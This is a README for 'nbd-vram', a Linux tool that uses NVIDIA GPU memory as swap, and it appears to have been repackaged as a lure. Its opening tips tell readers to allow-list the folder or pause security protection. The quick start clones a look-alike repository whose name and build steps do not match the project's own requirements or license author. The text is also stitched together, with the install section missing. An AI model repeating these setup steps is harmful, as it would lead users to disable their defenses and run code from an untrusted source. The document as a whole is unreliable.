# nbd-vram


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/exatickprevail/nbd-vram-656.git
cd nbd-vram-656
mkdir build && cd build
cmake ..
cmake --build . --config Release
```


Use your NVIDIA GPU's VRAM as swap space on Linux.

Built for hybrid graphics laptops with soldered memory and no upgrade path. The display runs off the integrated AMD/ATI GPU. The NVIDIA card sits idle most of the time, its VRAM completely unused. This puts that VRAM to work as high-priority swap.

Tested on: AMD/ATI + RTX 3070 Laptop (GA104M, 16 GB RAM, 8 GB VRAM), driver 580.159.03, kernel 6.17, Pop!_OS. Allocated 7 GB for swap. End result including zram and SSD swap: ~46 GB total addressable memory, tripled from stock. Overflow order: RAM fills, then VRAM absorbs the spill (PCIe), then zram compresses the rest (CPU), then SSD only if everything else is exhausted.

![demo](demo.gif)

---

## How it works

A small daemon allocates VRAM via the CUDA driver API, then serves it as a block device using the NBD (Network Block Device) protocol over a Unix socket. The kernel's built-in `nbd` driver connects to it and exposes `/dev/nbdX`. From there it's a normal swap device.

Data path: kernel swap subsystem - /dev/nbdX - nbd kernel driver - Unix socket - nbd-vram daemon - cuMemcpyHtoD/DtoH - GPU VRAM.

No kernel module to write or maintain. No NVIDIA kernel symbols. Survives kernel and driver updates without rebuilding anything.

---

## Why not the NVIDIA P2P API?

The "obvious" approach is `nvidia_p2p_get_pages_persistent`, which pins VRAM pages in BAR1 so the CPU can access them directly via `ioremap_wc`. Every existing project that tried this route hits the same wall: the NVIDIA driver returns `EINVAL` on consumer GeForce GPUs. Both the persistent and non-persistent variants, both flag values. It's gated at the RM level for Quadro/datacenter SKUs only, regardless of driver version.

The other approach - directly `ioremap_wc` the BAR1 physical address without going through the P2P API - also doesn't work. The GPU's internal page tables only have ~16 MiB of BAR1 mapped (just the display framebuffer). Reads from the rest return zeros. `mkswap` appears to succeed, then `swapon` fails because the swap header isn't actually there.

The NBD approach sidesteps all of this. `cuMemcpyHtoD` and `cuMemcpyDtoH` work on any CUDA GPU without any special permissions.

---

## Requirements

- NVIDIA GPU with CUDA support (any consumer RTX/GTX card)
- NVIDIA driver with `libcuda.so.1` (no CUDA toolkit needed)
- Linux kernel 3.0+ (nbd module, built into most distros)
- `nbd-client` package
- `gcc`, `make`

---


# NAME       TYPE      SIZE USED PRIO
# /dev/nbd0  partition   7G   0B 1500
```

The service is enabled on install, so it comes up automatically on every boot.

---

## Configuration

Edit `/etc/systemd/system/vram-swap-nbd.service`:

```ini
Environment=VRAM_SETUP_SIZE_MB=7168    # how much VRAM to use
Environment=VRAM_SWAP_PRIORITY=1500   # swap priority (higher = used first)
```

The daemon tries the requested size first and backs off in 512 MiB steps if the GPU is short on memory - so it will grab as much as it can even if the display compositor is already loaded. `VRAM_SETUP_SIZE_MB` is the ceiling, not a hard requirement.

After changing, run `sudo systemctl daemon-reload && sudo systemctl restart vram-swap-nbd`.

---

## Power management

The installer asks whether to enable power-aware management on first install. If enabled, the service automatically stops when you unplug from AC (or when battery drops below a threshold), and restarts when power is restored. Manual `systemctl stop` is always respected and won't be overridden.

To change settings after install, edit `/etc/nbd-vram.conf`. Changes take effect on the next poll (within 60 seconds) or immediately on the next AC plug/unplug event.

---

## Smoke test (without installing)

```sh
sudo bash test-nbd.sh
```

Allocates VRAM, connects the NBD device, does a 1 MiB write/readback check, activates swap, then prints teardown instructions. `install.sh` handles teardown automatically if a test instance is running.

To stress the full partition after the smoke test passes:

```sh
sudo bash test-fill.sh
```

Writes the entire VRAM partition with zeros, verifies a sample read back, then auto-restores swap on exit.

---

## Performance

Tested on RTX 3070 Laptop (8 GB VRAM), kernel 6.17, Pop!_OS. Compared against NVMe cryptswap (dm-crypt, PCIe 4.0). All benchmarks run with O_DIRECT to bypass page cache.

Three benchmarks are in `benchmarks/`. Each runs NVMe first, then starts the VRAM service and runs the same test against the block device. State is restored on exit.

```sh
sudo bash benchmarks/bench-throughput.sh   # sequential read/write (dd, 2 GiB, O_DIRECT)
sudo bash benchmarks/bench-iops.sh         # 4K random IOPS (fio, libaio, iodepth=32)
sudo bash benchmarks/bench-latency.sh      # per-operation latency (ioping, 20 requests)
```

`fio` and `ioping` are installed automatically if missing.

---

### Sequential throughput (dd, 2 GiB)

![bench-throughput](benchmarks/bench-throughput.gif)

| Device | Write | Read |
|--------|-------|------|
| NVMe | 2.7 GB/s | 2.9 GB/s |
| VRAM (nbd) | 1.1 GB/s | 2.3 GB/s |

VRAM is slower for large sequential transfers. The bottleneck is the NBD + CUDA userspace round-trip - every block crosses a Unix socket and a `cuMemcpy` call, which adds overhead that NVMe's direct kernel block path doesn't pay. Sequential throughput is not the primary swap workload (the kernel swaps individual 4K pages, not 4 MiB streams) - see the IOPS and latency benchmarks below.

---

### 4K random IOPS (fio, libaio, iodepth=32)

![bench-iops](benchmarks/bench-iops.gif)

| Device | Read IOPS | Write IOPS | Avg latency |
|--------|-----------|------------|-------------|
| NVMe | 45.4k | 45.3k | 343 us |
| VRAM (nbd) | 28.7k | 28.7k | 550 us |

NVMe wins for sustained random I/O. At iodepth=32, NVMe can have 32 requests genuinely in flight simultaneously; the NBD+CUDA path serialises them through the daemon, so the depth advantage is reduced. The VRAM daemon also adds CPU overhead that the NVMe path does not pay. For continuous high-throughput swap pressure, NVMe is faster.

The picture changes for sporadic access - see the latency benchmark below.

---

### Per-operation latency (ioping, 4K reads, 1 request/sec)

![bench-latency](benchmarks/bench-latency.gif)

| Device | Min | Avg | Max |
|--------|-----|-----|-----|
| NVMe | 120 us | 9.05 ms | 10.1 ms |
| VRAM (nbd) | 134 us | 335 us | 490 us |

**VRAM is 27x faster average latency.** The NVMe drive is physically capable of ~112 us (visible on the warmup request) but APST (Autonomous Power State Transitions) puts it to sleep between requests. At 1 request per second - the rate of sporadic swap access - it wakes cold almost every time and pays a ~9 ms penalty. VRAM has no power states and responds in 133-490 us consistently.

This is the scenario that matters most in practice. Memory pressure on a laptop is rarely a sustained GB/s flood - it is individual 4K page faults arriving seconds apart. Every one of those faults stalls waiting for the swap device to respond. At 9 ms per fault, NVMe swap is felt. At 335 us, VRAM swap is not.

---

## Uninstall

```sh
sudo bash uninstall.sh
```

---

## License

MIT - Sean Lobjoit (c0dejedi)


<!-- Last updated: 2026-06-06 17:28:16 -->
